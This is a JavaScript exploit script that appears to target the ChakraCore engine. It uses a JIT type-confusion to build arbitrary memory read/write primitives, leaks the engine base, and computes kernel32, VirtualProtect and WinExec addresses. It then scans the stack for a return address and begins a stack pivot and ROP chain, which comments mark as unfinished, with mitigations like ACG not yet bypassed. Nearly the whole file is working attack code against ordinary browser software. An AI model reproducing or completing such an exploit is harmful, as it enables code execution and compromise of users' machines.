var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);
var BASE = 0x100000000;
function hex(x) {
    return `0x${x.toString(16)}`
}

function bytes_to_u64(bytes) {
    return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
                +bytes[4]*0x100000000+bytes[5]*0x10000000000);
}

function i2f(x) {
    u32[0] = x % BASE;

    u32[1] = (x - (x % BASE)) / BASE;
    return f64[0];
}

function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}

obj = {}
obj.a = 0;
obj.b = 1;
obj.c = 2;
obj.d = 3;
obj.e = 4;
obj.f = 5;
obj.g = 6;
obj.h = 7; 
obj.i = 8;

target = new Float64Array(new ArrayBuffer(0x100))
function log(f){
    print("[+] " + f)
}
function opt(o, c, value) {
    o.b = 1;

    class A extends c {

    }

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, (function () {}), {});
    }

    let o = {a: 1, b: 2};
    let cons = function () {};

    cons.prototype = o;

    opt(o, cons, obj);

    o.c = target
    obj.h = target; 
    log("vtable pointer  " + hex(f2i(target[0])));
    log("buffer internal " + hex(f2i(target[7])))
    var vtable = hex(f2i(target[0]))
    var bufferInt = f2i(target[7])
    var chakrabase = f2i(target[0]) - 0x01645090
    print("[+] chakrabase @ 0x" + chakrabase.toString(16))


    let readPtr = function(addr){
        //read permtives is good now 
        tmp = target[0]

        target[7] = i2f(addr);
        try{
        return f2i(target[0])
    }finally{
        obj.h = target; 
    }
    }

    let write = function(addr,what){

        target[7] = i2f(addr)
        target[0] = i2f(what)
        obj.h = target;
    }

    write(bufferInt+0x10,0x4141414141)
    if(readPtr(bufferInt+0x10) != 0x4141414141){
        throw null 
    }

    log(" R/W ready to hit !!!")
    var threadContextVtable = chakrabase + 0x0191b530
    log("threadContextVtable " + hex(threadContextVtable))
    log("Debug session ")
    var threadPtr = readPtr(threadContextVtable)
    log("threadPtr  " + threadPtr.toString(16))
    var stack = readPtr(threadPtr + 0x588)
    var retAddr = chakrabase + 0x00bb1972
    log("stack " + hex(stack))
    log("the ret address  " + hex(retAddr))
    log("start looking for return address")
    while(true){
        if (readPtr(stack) == retAddr){
            log("got the return address")
            break
        }
        stack = stack - 8 
    }

    kernel32 = chakrabase + 0x28ce0000
    kernelbase = kernel32 + 0x3030000
    virtualPro = kernelbase + 0x61700
    winEx = kernel32 + 0x5e330
    log("kernel32 " + hex(kernel32))
    log("kernelbase " + hex(kernelbase))
    log("VirtualProtect " + hex(virtualPro) )
    log("winEx " + hex(winEx))


    bufAddr = bufferInt+0x900
    var countRop = 0
    function ropChain(what){
        write(bufferInt+0x900+countRop,what)
        countRop += 0x8
    return countRop
    }

    //Stack Pivoting 
    ropPointer = stack + 8 
    write(ropPointer, 0x414141414141);
    write(stack,chakrabase + 0xe235e6) // mov r11, qword ptr[rsp+8];
    write(stack+0x10, bufAddr)
    write(stack+0x18,chakrabase + 0xedeb7c)

    //ROP chain start here :D 
    //
    ropChain(0xdead4141)
    ropChain(chakrabase + 0x014d8dd5) // pop rdx, ret
    ropChain(0x0000000005) ;; // to rdx
    ropChain(chakrabase + 0xe2db53) // pop rcx;ret
    ropChain(0x4141414141)
    ropChain(0x000004142)

    // To Do 
    // Bypass ACG and others mitgations if needed :(
    // please don't do ret2libc , 
    // This is not a CTF :D
    

}

main()